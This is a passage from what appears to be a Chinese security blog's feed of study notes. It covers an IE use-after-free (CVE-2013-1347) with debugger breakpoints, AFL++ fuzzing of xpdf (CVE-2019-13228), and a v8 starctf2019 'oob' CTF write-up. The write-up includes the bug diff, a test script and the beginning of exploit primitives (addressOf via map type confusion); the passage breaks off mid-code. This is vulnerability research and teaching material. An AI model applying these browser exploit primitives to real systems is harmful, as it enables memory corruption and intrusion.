    <content type="html"><![CDATA[<p>这块内存已被释放</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102112450910.png" alt="image-20220102112450910"></p><p>通过调用CSpanElement::CreateElement函数创建span元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102113558401.png" alt="image-20220102113558401"></p><p>函数内部通过HeapAlloc申请长度为0x28大小内存空间</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102114100898.png" alt="image-20220102114100898"></p><p>查找插入位置,这里查找到了body元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102141539670.png" alt="image-20220102141539670"></p><p>CTreeNode元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102150101085.png" alt="image-20220102150101085"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143414127.png" alt="image-20220103143414127"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103144243241.png" alt="image-20220103144243241"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143548884.png" alt="image-20220103143548884"></p><p>下面开始分析CElement,CTreeNode的释放情况.</p><p>当去掉f0.offsetParent&#x3D;null,两者都会被释放.</p><p>当加上f0.offsetParent&#x3D;null,CTreeNode不会被释放,CElement会被释放,同时CTreeNode对象依然保存着CElement对象的地址,导致后面CollectGarbage调用时引用到了这个地址的函数,造成了漏洞的发生.所以问题的关键就在于为什么CTreeNode元素没有被释放.</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151706142.png" alt="image-20220105151706142"></p><p>TreeNode</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151638784.png" alt="image-20220105151638784"></p><p>CElement</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151700542.png" alt="image-20220105151700542"></p><p>对比一下f0.offsetParent&#x3D;null去除与未去除状态下的堆栈情况</p><p>为了明白CTreeNode没有被释放的原因,要弄清楚f0.offsetParent&#x3D;null在内存中做了什么,通过搜索offsetParent,可以找到对应函数CElement::GetOffsetParentHelper,对GetOffsetParentHelper执行前后的CTreeNode进行一个对比,看看修改了哪些值.</p><p>+8,+C位置发送了变化.</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143414127.png" alt="image-20220103143414127"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103144234127.png" alt="image-20220103144234127"></p><p>对比着IE5的源码看一下这两个值.</p><p>+4+8位置是CElement对象地址和父节点CTreeNode对象地址,后面4个字节是一些标志位,+C位置是定义CharFormat的值,这个值的作用暂时不知道,对这个值下读断点调一下.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Class Data</span><br>   CElement*   _pElement;                          <span class="hljs-comment">// The element for this node</span><br>   CTreeNode*  _pNodeParent;                       <span class="hljs-comment">// The parent in the CTreeNode tree</span><br><br>   <span class="hljs-comment">// DWORD 1</span><br>   BYTE        _etag;                              <span class="hljs-comment">// 0-7:     element tag</span><br>   BYTE        _fFirstCommonAncestorNode   : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 8:       for finding common ancestor</span><br>   BYTE        _fInMarkup                  : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 9:       this node is in a markup and shouldn&#x27;t die</span><br>   BYTE        _fInMarkupDestruction       : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 10:      Used by CMarkup::DestroySplayTree</span><br>   BYTE        _fHasLookasidePtr           : <span class="hljs-number">2</span>;    <span class="hljs-comment">// 11-12    Lookaside flags</span><br>   BYTE        _fBlockNess                 : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 13:      Cached from format -- valid if _iFF != -1</span><br>   BYTE        _fHasLayout                 : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 14:      Cached from format -- valid if _iFF != -1</span><br>   BYTE        _fUnused                    : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 15:      Unused</span><br><br>   SHORT       _iPF;                               <span class="hljs-comment">// 16-31:   Paragraph Format</span><br><br>   <span class="hljs-comment">// DWORD 2</span><br>   SHORT       _iCF;                               <span class="hljs-comment">// 0-15:    Char Format</span><br>   SHORT       _iFF;                               <span class="hljs-comment">// 16-31:   Fancy Format</span><br></code></pre></td></tr></table></figure><p>sxe ld:mshtml</p><p>bp mshtml+17d715 “ln eax;g”</p><p>bp mshtml!CElement::CElement+0x1e “.echo ‘&#x3D;&#x3D;&#x3D;CElement&#x3D;&#x3D;&#x3D;’;dd esi l(28&#x2F;4);g “</p><p>bp mshtml+fb0af “.echo ‘&#x3D;&#x3D;&#x3D;CTreeNode&#x3D;&#x3D;&#x3D;’;dd eax l13;g”</p><p>bp mshtml!CElement::GetOffsetParentHelper</p><p>bu jscript!JsAtan2 “.printf &quot;%mu&quot;,poi(poi(poi(esp+14)+8)+8);.echo;”</p><p>bp mshtml!+92ab8</p><p>bp mshtml+8bed9 “.echo ‘&#x3D;&#x3D;&#x3D;eax+4&#x3D;&#x3D;&#x3D;’;dd eax+4;g”</p><p>ba w4 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101_01</title>
    <link href="/2022/12/27/Fuzzing101__01/"/>
    <url>/2022/12/27/Fuzzing101__01/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing101-01"><a href="#Fuzzing101-01" class="headerlink" title="Fuzzing101__01"></a>Fuzzing101__01</h1><p>CVE-2019-13228漏洞,xpdf-3.02 parse.cc文件getObj函数的无限递归漏洞,可用于DDos攻击 <img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%872.png"> </p><p>使用afl++进行fuzz 编译 Export LLVM_CONFIG&#x3D;”llvm-config-11” CC&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast Make&amp;&amp;Make install </p><p>随便下载几个pdf作为种子 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%871.png"> </p><p>开始fuzz </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%873.png"></p><p> Fuzz结果 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%874.png"> </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%875.png"> </p><p>运行结果 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%876.png"> </p><p>使用gdb进行调试 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%877.png"> </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%878.png"> </p><p>bt查看堆栈,很明显大量调用Parse::getObj造成无限递归 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%879.png"> </p><p>该漏洞在xpdf 4.02版本被修复,下载4.02版本,对比parse.cc文件,可以很明显的看出getObj函数增加了两个参数simpleOnly和recurion作为判断,防止了无限递归调用 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%8710.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>v8漏洞练习笔记_starctf2019 oob</title>
    <link href="/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/"/>
    <url>/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/</url>
    
    <content type="html"><![CDATA[<h1 id="v8漏洞练习笔记-starctf2019-oob"><a href="#v8漏洞练习笔记-starctf2019-oob" class="headerlink" title="v8漏洞练习笔记_starctf2019 oob"></a>v8漏洞练习笔记_starctf2019 oob</h1><h5 id="v8内存结构"><a href="#v8内存结构" class="headerlink" title="v8内存结构"></a>v8内存结构</h5><p>v8变量内存结构,新版v8使用了指针压缩,基址存于R13寄存器,指针通过32为存储,最后一位表示tag,为1时会与R13中的基址进行运算 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">DebugPrint: 0x101f080c5e09: [JSArray]<br><br>- map: 0x101f08281891 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br>- prototype: 0x101f08248f7d &lt;JSArray[0]&gt;<br><br>- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br>- length: 4<br><br>- properties: 0x101f080406e9 &lt;FixedArray[0]&gt; &#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">length: 0x101f081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br>  &#125;<br><br>- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; &#123;<br><br>   0: 2.1<br><br>   1: 3.2<br><br>   2: 0.1<br><br>   3: 1<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>其中elements是实际存储数据的对象元素,所以实际上是v8对变量做了2层封装,data-&gt;elements-&gt;JSArrayObject,通过map结构存储. </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/10gx <span class="hljs-number">0x101f080c5e08</span><br><br><span class="hljs-number">0x101f080c5e08</span>:  <span class="hljs-number">0x080406e908281891</span>  <span class="hljs-number">0x00000008080c5de1</span><br><br><span class="hljs-number">0x101f080c5e18</span>:  <span class="hljs-number">0x080406e908284e79</span>  <span class="hljs-number">0x00000002080406e9</span><br><br><span class="hljs-number">0x101f080c5e28</span>:  <span class="hljs-number">0x00010001080401c5</span>  <span class="hljs-number">0x0804116d00000000</span><br><br><span class="hljs-number">0x101f080c5e38</span>:  <span class="hljs-number">0x000000880808a5e5</span>  <span class="hljs-number">0x080404b100000002</span><br><br><span class="hljs-number">0x101f080c5e48</span>:  <span class="hljs-number">0x080c5e1900000002</span>  <span class="hljs-number">0x080406e9082818e1</span><br><br> <br><br>pwndbg&gt; job <span class="hljs-number">0x101f080c5de1</span><br><br><span class="hljs-number">0x101f080c5de1</span>: [FixedDoubleArray]<br><br> - map: <span class="hljs-number">0x101f08040a3d</span> &lt;Map&gt;<br><br> - length: <span class="hljs-number">4</span><br><br>​      <span class="hljs-number">0</span>: <span class="hljs-number">2.1</span><br><br>​      <span class="hljs-number">1</span>: <span class="hljs-number">3.2</span><br><br>​      <span class="hljs-number">2</span>: <span class="hljs-number">0.1</span><br><br>​      <span class="hljs-number">3</span>: <span class="hljs-number">1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">elements:</span><br><br>map,length,value<br><br>pwndbg&gt; x/8x <span class="hljs-number">0x101f080c5de0</span><br><br><span class="hljs-number">0x101f080c5de0</span>:  <span class="hljs-number">0x0000000808040a3d</span>  <span class="hljs-number">0x4000cccccccccccd</span><br><br><span class="hljs-number">0x101f080c5df0</span>:  <span class="hljs-number">0x400999999999999a</span>  <span class="hljs-number">0x3fb999999999999a</span><br><br><span class="hljs-number">0x101f080c5e00</span>:  <span class="hljs-number">0x3ff0000000000000</span>  <span class="hljs-number">0x080406e908281891</span><br><br><span class="hljs-number">0x101f080c5e10</span>:  <span class="hljs-number">0x00000008080c5de1</span>  <span class="hljs-number">0x080406e908284e79</span><br></code></pre></td></tr></table></figure><p>两个结构的length均做了*2处理.</p><p>其中描述了这个变量的属性信息,包括类型,长度,element等 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">0x101f08281891: [Map]<br><br> - type: JS_ARRAY_TYPE<br><br> - instance size: 16<br><br> - inobject properties: 0<br><br> - elements kind: PACKED_DOUBLE_ELEMENTS<br><br> - unused property fields: 0<br><br> - enum length: invalid<br><br> - back pointer: 0x101f08281869 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;<br><br> - prototype_validity cell: 0x101f081c0451 &lt;Cell value= 1&gt;<br><br> - instance descriptors #1: 0x101f08249605 &lt;DescriptorArray[1]&gt;<br><br> - transitions #1: 0x101f08249651 &lt;TransitionArray[4]&gt;Transition array #1:<br><br>   0x101f08042eb9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x101f082818b9 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;<br><br> <br> - prototype: 0x101f08248f7d &lt;JSArray[0]&gt;<br><br> - constructor: 0x101f08248e51 &lt;JSFunction Array (sfi = 0x101f081cbf85)&gt;<br><br> - dependent code: 0x101f080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br><br> - construction counter: 0<br></code></pre></td></tr></table></figure><p>实际内存结构 { map:32bit properties:32bit elements } elements结构 { map, } 变量在内存中的结构是一致的,并且大小为64bit,指针类型变量被压缩,占32bit. </p><h5 id="starctf-2019-oob"><a href="#starctf-2019-oob" class="headerlink" title="starctf 2019 oob"></a>starctf 2019 oob</h5><p>diff片段,增加了一个oob函数,函数逻辑为当参数为1,也就是不传参,只有一个this参数时,会读取数组length索引的值,不为1,则会将传参数据写入length索引处,两种方式都会造成数组访问越界. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,<br><br>​              Builtins::kArrayPrototypeCopyWithin, 2, false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,<br><br>​              Builtins::kArrayPrototypeFill, 1, false);<br><br>+  SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,<br><br>+             Builtins::kArrayOob,2,false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;find&quot;,<br><br>​              Builtins::kArrayPrototypeFind, 1, false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,<br><br>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc<br><br>index 8df340e..9b828ab 100644<br><br>--- a/src/builtins/builtins-array.cc<br><br>+++ b/src/builtins/builtins-array.cc<br><br>@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,<br><br>  return *final_length;<br><br> &#125;<br><br> &#125; // namespace<br><br>+BUILTIN(ArrayOob)&#123;<br><br>+  uint32_t len = args.length();<br><br>+  if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();<br><br>+  Handle&lt;JSReceiver&gt; receiver;<br><br>+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<br><br>+      isolate, receiver, Object::ToObject(isolate, args.receiver()));<br><br>+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);<br><br>+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());<br><br>+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());<br><br>+  if(len == 1)&#123;<br><br>+    //read<br><br>+    return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));<br><br>+  &#125;else&#123;<br><br>+    //write<br><br>+    Handle&lt;Object&gt; value;<br><br>+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<br><br>+        isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));<br><br>+    elements.set(length,value-&gt;Number());<br><br>+    return ReadOnlyRoots(isolate).undefined_value();<br><br>+  &#125;<br><br>+&#125;<br></code></pre></td></tr></table></figure><p>构造这样一个JS文件,对oob进行测试. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-keyword">var</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1.1</span>];<br><br>%<span class="hljs-title class_">DebugPrint</span>(a);<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br><span class="hljs-keyword">var</span> data = a.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;data:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">ftoi</span>(data)));<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br>a.<span class="hljs-title function_">oob</span>(<span class="hljs-number">2</span>);<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>通过越界访问读取到的数据,刚好是a的map. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x062a0214e041</span><br><br>0x62a0214e041: [JSArray]<br><br> - map: 0x3629c0182ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br> - prototype: 0x20262e251111 &lt;JSArray[0]&gt;<br><br> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br> - length: 3<br><br> - properties: 0x2b2ef8980c71 &lt;FixedArray[0]&gt; &#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> #</span><span class="language-bash">length: 0x3a4d7cec01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> &#125;<br><br> - elements: 0x062a0214e019 &lt;FixedDoubleArray[3]&gt; &#123;<br><br>​      0: 1<br><br>​      1: 2<br><br>​      2: 1.1<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span><br><br>Continuing.<br><br>data:0x3629c0182ed9<br></code></pre></td></tr></table></figure><p>在a.oob(2)执行后,a对象的map字段被修改为2的浮点数表示. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pwndbg&gt; x/8gx <span class="hljs-number">0x062a0214e040</span><br><br><span class="hljs-number">0x62a0214e040</span>:  <span class="hljs-number">0x00003629c0182ed9</span>  <span class="hljs-number">0x00002b2ef8980c71</span><br><br><span class="hljs-number">0x62a0214e050</span>:  <span class="hljs-number">0x0000062a0214e019</span>  <span class="hljs-number">0x0000000300000000</span><br><br><span class="hljs-number">0x62a0214e060</span>:  <span class="hljs-number">0x00002b2ef8980561</span>  <span class="hljs-number">0x00003629c0182ed9</span><br><br><span class="hljs-number">0x62a0214e070</span>:  <span class="hljs-number">0x00002b2ef89812c9</span>  <span class="hljs-number">0x0000000100000000</span><br><br> <br><br>pwndbg&gt; x/8gx <span class="hljs-number">0x062a0214e040</span><br><br><span class="hljs-number">0x62a0214e040</span>:  <span class="hljs-number">0x4000000000000000</span>  <span class="hljs-number">0x00002b2ef8980c71</span><br><br><span class="hljs-number">0x62a0214e050</span>:  <span class="hljs-number">0x0000062a0214e019</span>  <span class="hljs-number">0x0000000300000000</span><br><br><span class="hljs-number">0x62a0214e060</span>:  <span class="hljs-number">0x00002b2ef8980561</span>  <span class="hljs-number">0x00003629c0182ed9</span><br><br><span class="hljs-number">0x62a0214e070</span>:  <span class="hljs-number">0x00002b2ef89812c9</span>  <span class="hljs-number">0x0000000100000000</span><br></code></pre></td></tr></table></figure><p>现在可以通过oob函数对变量的map字段进行任意读取写入,然后对变量的类型进行随意的更改. 可以混淆对象数组和浮点数组的类型,用于读取对象内存地址或者将一个浮点数伪造成一个js对象.因为v8依赖map字段判断变量类型. 实现任意对象内存地址读取,与fake js对象的函数. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> obj_addr;<br><br>&#125;<br><br><span 